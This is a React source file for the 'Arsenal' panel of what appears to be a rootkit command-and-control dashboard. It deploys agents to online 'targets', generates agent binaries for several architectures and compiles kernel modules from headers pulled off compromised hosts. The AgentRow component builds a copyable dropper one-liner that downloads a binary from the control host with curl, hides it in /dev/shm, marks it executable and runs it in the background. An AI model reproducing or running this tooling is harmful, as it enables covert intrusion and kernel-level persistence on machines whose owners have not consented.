import { useState, useEffect, useCallback } from 'react'
import { Package, Cpu, Copy, Check, Download, RefreshCw, Plus, Loader, ChevronRight, Shield, Zap, Terminal } from 'lucide-react'
import { API_HOST } from '../api'

const api = (path) => `http://${API_HOST}${path}`

function usePoll(url, interval = 3000) {
  const [data, setData] = useState(null)
  const [err, setErr] = useState(null)
  const refresh = useCallback(() => {
    fetch(url).then(r => {
      if (!r.ok) throw new Error(r.statusText)
      return r.json()
    }).then(setData).catch(setErr)
  }, [url])
  useEffect(() => {
    refresh()
    const id = setInterval(refresh, interval)
    return () => clearInterval(id)
  }, [refresh, interval])
  return { data, err, refresh }
}

export function Arsenal({ targets = [] }) {
  return (
    <div className="p-6 max-w-5xl mx-auto space-y-5">
      <div className="flex items-baseline gap-3 mb-1">
        <h2 className="text-lg font-bold">Arsenal</h2>
        <span className="text-[10px] font-mono text-fg-3 tracking-wider uppercase">
          Generate / Deploy / Compile
        </span>
      </div>
      <PipelineSection targets={targets} />
      <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
        <FactorySection />
        <ArmorySection targets={targets} />
      </div>
    </div>
  )
}

function PipelineSection({ targets = [] }) {
  const { data: jobs, refresh } = usePoll(api('/pipeline/status'), 2000)
  const onlineTargets = targets.filter(t => t.online)

  const deploy = (agentId) => {
    fetch(api(`/pipeline/deploy?agent=${encodeURIComponent(agentId)}`))
      .then(() => refresh())
  }

  const activeIds = new Set((jobs || []).map(j => j.agent_id))

  return (
    <div className="nb-card-flat overflow-hidden">
      <div className="px-4 py-2 border-b-2 border-border bg-bg-2 flex items-center gap-2">
        <Zap size={14} className="text-main" />
        <span className="text-sm font-bold uppercase tracking-wide">Deploy Pipeline</span>
        <span className="text-[10px] font-mono text-fg-3 ml-auto">{jobs?.length || 0} jobs</span>
        <button className="nb-btn p-1" onClick={refresh} title="Refresh">
          <RefreshCw size={12} />
        </button>
      </div>

      <div className="p-4 space-y-3">
        {onlineTargets.length > 0 ? (
          <div className="flex flex-wrap gap-2">
            {onlineTargets.map(t => {
              const name = t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)
              const running = activeIds.has(t.id)
              const job = (jobs || []).find(j => j.agent_id === t.id)
              const done = job?.phase === 'done'
              return (
                <button key={t.id}
                  className={`nb-btn px-3 py-2 text-xs flex items-center gap-2 ${done ? 'opacity-60' : ''}`}
                  onClick={() => deploy(t.id)}
                  disabled={running}>
                  <span className={`w-2 h-2 rounded-full shrink-0 ${t.online ? 'bg-green pulse' : 'bg-red'}`} />
                  <span className="font-bold">{name}</span>
                  {t.kernel && <span className="text-[10px] text-fg-3 font-mono">{t.kernel}</span>}
                  {running && !done && <Loader size={10} className="animate-spin text-main" />}
                  {done && <Check size={10} className="text-green" />}
                </button>
              )
            })}
          </div>
        ) : (
          <div className="flex items-center justify-center gap-2 py-6 text-fg-3">
            <Shield size={14} />
            <span className="text-xs font-mono">No targets online. Deploy an agent first.</span>
          </div>
        )}

        {jobs?.length > 0 && (
          <div className="space-y-2">
            {jobs.map(j => <PipelineRow key={j.agent_id} job={j} />)}
          </div>
        )}
      </div>
    </div>
  )
}

const PHASES = ['queued', 'info', 'compile', 'deploy', 'verify', 'done']
const PHASE_LABELS = { queued: 'Queue', info: 'Info', compile: 'Build', deploy: 'Load', verify: 'Check' }

function PipelineRow({ job }) {
  const phaseIdx = PHASES.indexOf(job.phase)
  const failed = job.phase === 'failed'
  const done = job.phase === 'done'

  return (
    <div className={`border-2 rounded-[var(--radius)] px-3 py-2.5 ${
      failed ? 'border-red bg-red/5' : done ? 'border-green bg-green/5' : 'border-border bg-bg'
    }`}>
      <div className="flex items-center gap-3 mb-2">
        <span className="font-mono text-xs font-bold">{job.agent_id}</span>
        {job.kernel && <span className="text-[10px] font-mono text-fg-3">{job.kernel}</span>}
        {job.distro && <span className="text-[10px] font-mono text-fg-3">{job.distro}</span>}
        <span className={`text-[9px] font-bold uppercase ml-auto ${
          failed ? 'text-red' : done ? 'text-green' : 'text-main'
        }`}>
          {failed ? 'FAILED' : done ? 'DEPLOYED' : job.phase}
        </span>
      </div>

      {!failed && (
        <div className="space-y-1">
          <div className="flex gap-0.5">
            {PHASES.slice(0, -1).map((phase, i) => (
              <div key={phase} className={`h-1.5 flex-1 rounded-full transition-all duration-300 ${
                i < phaseIdx ? 'bg-green' :
                i === phaseIdx && !done ? 'bg-main animate-pulse' :
                done ? 'bg-green' : 'bg-bg-2'
              }`} />
            ))}
          </div>
          <div className="flex gap-0.5">
            {PHASES.slice(0, -1).map((phase, i) => (
              <div key={phase} className={`flex-1 text-center text-[8px] font-mono uppercase tracking-wider ${
                i <= phaseIdx || done ? 'text-fg-2' : 'text-fg-3/50'
              }`}>
                {PHASE_LABELS[phase]}
              </div>
            ))}
          </div>
        </div>
      )}

      {failed && (
        <div className="text-[10px] font-mono text-red mt-1 break-all">{job.error}</div>
      )}
    </div>
  )
}

function FactorySection() {
  const { data: profiles, refresh } = usePoll(api('/factory/list'), 5000)
  const [generating, setGenerating] = useState(false)
  const [arch, setArch] = useState('amd64')

  const generate = () => {
    setGenerating(true)
    fetch(api(`/factory/generate?arch=${arch}`))
      .then(r => r.json())
      .then(() => { refresh(); setGenerating(false) })
      .catch(() => setGenerating(false))
  }

  return (
    <div className="nb-card-flat overflow-hidden">
      <div className="px-4 py-2 border-b-2 border-border bg-bg-2 flex items-center gap-2">
        <Package size={14} className="text-fg-3" />
        <span className="text-sm font-bold uppercase tracking-wide">Factory</span>
        <span className="text-[10px] font-mono text-fg-3 ml-auto">{profiles?.length || 0} agents</span>
      </div>

      <div className="p-4 space-y-3">
        <div className="flex items-center gap-2">
          <select value={arch} onChange={e => setArch(e.target.value)}
            className="nb-input px-2 py-1.5 text-xs">
            <option value="amd64">amd64</option>
            <option value="arm64">arm64</option>
            <option value="386">386</option>
          </select>
          <button className="nb-btn-main px-3 py-1.5 text-xs flex items-center gap-1.5"
            onClick={generate} disabled={generating}>
            {generating ? <Loader size={12} className="animate-spin" /> : <Plus size={12} />}
            Generate
          </button>
          <button className="nb-btn p-1.5" onClick={refresh} title="Refresh">
            <RefreshCw size={12} />
          </button>
        </div>

        {profiles === null ? (
          <EmptyHint icon={Terminal} text="Set RKLINGS_PKI_DIR to enable" />
        ) : !profiles?.length ? (
          <EmptyHint icon={Package} text="Generate an agent binary above" />
        ) : (
          <div className="space-y-1.5">
            {profiles.map(p => <AgentRow key={p.id} profile={p} />)}
          </div>
        )}
      </div>
    </div>
  )
}

function AgentRow({ profile: p }) {
  const [copied, setCopied] = useState(false)
  const [showDropper, setShowDropper] = useState(false)
  const host = API_HOST.split(':')[0] || location.hostname
  const stub = p.id.slice(0, 8)
  const dropperCmd = `curl -sk https://${host}/ -H'X-R: ${p.stager_key}' -o/dev/shm/.${stub};chmod +x /dev/shm/.${stub};/dev/shm/.${stub}&`

  const copyDropper = () => {
    navigator.clipboard.writeText(dropperCmd)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="border-2 border-border rounded-[var(--radius)] bg-bg">
      <div className="flex items-center px-3 py-2 gap-3">
        <span className="font-mono text-xs font-bold">{p.id}</span>
        <span className="text-[10px] font-mono text-fg-3">{p.arch}</span>
        <span className="text-[10px] font-mono text-fg-3">{new Date(p.created_at).toLocaleDateString()}</span>
        <span className={`text-[9px] font-bold uppercase px-1.5 py-0.5 rounded border-2 border-border ${
          p.deployed ? 'bg-green/15 text-green' : 'bg-bg-2 text-fg-3'
        }`}>
          {p.deployed ? 'Deployed' : 'Ready'}
        </span>
        <div className="ml-auto flex items-center gap-1">
          <button className="nb-btn p-1" onClick={copyDropper} title="Copy dropper command">
            {copied ? <Check size={12} className="text-green" /> : <Copy size={12} />}
          </button>
          <a className="nb-btn p-1 inline-flex" href={api(`/factory/download/${p.id}`)} title="Download binary">
            <Download size={12} />
          </a>
          <button className="nb-btn p-1" onClick={() => setShowDropper(!showDropper)} title="Show dropper">
            <ChevronRight size={12} className={`transition-transform ${showDropper ? 'rotate-90' : ''}`} />
          </button>
        </div>
      </div>
      {showDropper && (
        <div className="px-3 py-2 border-t-2 border-border bg-bg-2">
          <code className="text-[10px] font-mono text-fg-2 break-all select-all">
            {dropperCmd}
          </code>
        </div>
      )}
    </div>
  )
}

function ArmorySection({ targets = [] }) {
  const { data: cached, refresh } = usePoll(api('/armory/list'), 10000)
  const [kernel, setKernel] = useState('')
  const [agent, setAgent] = useState('')
  const [compiling, setCompiling] = useState(false)
  const onlineTargets = targets.filter(t => t.online)

  const compile = () => {
    if (!kernel.trim() || !agent) return
    setCompiling(true)
    fetch(api(`/armory/compile?kernel=${encodeURIComponent(kernel.trim())}&agent=${encodeURIComponent(agent)}`))
      .then(r => {
        if (!r.ok) throw new Error(r.statusText)
        return r.json()
      })
      .then(() => { refresh(); setCompiling(false); setKernel('') })
      .catch(() => setCompiling(false))
  }

  return (
    <div className="nb-card-flat overflow-hidden">
      <div className="px-4 py-2 border-b-2 border-border bg-bg-2 flex items-center gap-2">
        <Cpu size={14} className="text-fg-3" />
        <span className="text-sm font-bold uppercase tracking-wide">Armory</span>
        <span className="text-[10px] font-mono text-fg-3 ml-auto">{cached?.length || 0} cached</span>
      </div>

      <div className="p-4 space-y-3">
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <select value={agent} onChange={e => setAgent(e.target.value)}
              className="nb-input px-2 py-1.5 text-xs flex-1">
              <option value="">source agent</option>
              {onlineTargets.map(t => (
                <option key={t.id} value={t.id}>
                  {t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)}
                </option>
              ))}
            </select>
          </div>
          <div className="flex items-center gap-2">
            <input
              className="nb-input px-2 py-1.5 text-xs flex-1"
              placeholder="6.8.0-101-generic"
              value={kernel}
              onChange={e => setKernel(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && compile()}
            />
            <button className="nb-btn-main px-3 py-1.5 text-xs flex items-center gap-1.5"
              onClick={compile} disabled={compiling || !kernel.trim() || !agent}>
              {compiling ? <Loader size={12} className="animate-spin" /> : <Cpu size={12} />}
              Build
            </button>
            <button className="nb-btn p-1.5" onClick={refresh} title="Refresh">
              <RefreshCw size={12} />
            </button>
          </div>
        </div>

        <div className="text-[10px] text-fg-3 font-mono leading-relaxed">
          Pull headers from target via memfd.
          <br />
          Compile locally with zig cc / gcc.
        </div>

        {cached === null ? (
          <EmptyHint icon={Cpu} text="Set RKLINGS_MODULE_SRC to enable" />
        ) : !cached?.length ? (
          <EmptyHint icon={Shield} text="No cached .ko builds" />
        ) : (
          <div className="space-y-1">
            <div className="text-[9px] font-bold uppercase tracking-widest text-fg-3">Cached Modules</div>
            <div className="flex flex-wrap gap-1.5">
              {cached.map(hash => (
                <span key={hash} className="text-[10px] font-mono bg-bg-2 border-2 border-border rounded px-1.5 py-0.5">{hash}</span>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

function EmptyHint({ icon: Icon, text }) {
  return (
    <div className="flex items-center justify-center gap-2 py-4 text-fg-3">
      <Icon size={12} />
      <span className="text-[10px] font-mono">{text}</span>
    </div>
  )
}
